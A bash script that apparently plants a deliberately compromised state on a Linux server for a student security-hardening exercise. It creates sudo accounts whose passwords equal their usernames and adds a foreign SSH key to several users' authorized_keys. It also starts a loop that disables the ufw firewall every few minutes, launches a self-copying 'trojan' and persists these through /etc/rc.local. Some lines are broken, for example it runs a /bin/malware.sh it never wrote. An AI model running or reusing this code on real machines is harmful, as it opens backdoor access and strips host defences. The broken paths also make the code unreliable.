#!/bin/bash
# useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group
# -u uid

/bin/sed -i "s/^#Banner.*/Banner etc\/issue.net/g" /etc/ssh/sshd_config

cat << EOF > /etc/issue.net
HELLO WELCOME TO TODDs POKEMON SERVER!
EOF


for user in nemo dory marlin squirt bruce crush nigel gill
do
  useradd -m -p $(openssl passwd -crypt $user) $user

  mkdir -p /home/$user/.ssh && touch /home/$user/.ssh/authorized_keys 
cat << EOF >> /home/$user/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF

done

for user in  harry hermione ron draco voldemort hagard sirius snape dumbledore
do
  useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
done

cat << EOF > /bin/virus.sh
#!/bin/bash
while true
do
  /usr/sbin/ufw disable
  sleep 500
done
EOF
chmod 755 /bin/virus.sh
/bin/virus.sh &

cat << EOF > /bin/worm.sh
#!/bin/bash
while true
do
  /bin/echo 'A worm is running' >>/home/student/wormFile.txt
  sleep 60
done
EOF
chmod 755 /bin/malware.sh
/bin/malware.sh &


cat << EOF > /bin/trojan.sh
#!/bin/bash
while true
do
  /bin/cp /bin/trojan.sh /home/student/trojan-virus
  sleep 1
  /home/student/trojan-virus &
  sleep 120
done
EOF
chmod 755 /bin/trojan.sh
/bin/trojan.sh &

cat << EOF > /etc/rc.local
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other

#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/bin/virus.sh || bin/true
/bin/trojan.sh || /bin/true
/bin/worm.sh || bin/true
/bin/malwarm.sh || bin/true
/bin/virus.sh || bin/true
/bin/trojan.sh || /bin/true
/bin/worm.sh || bin/true
/bin/malwarm.sh || bin/true
exit 0
EOF
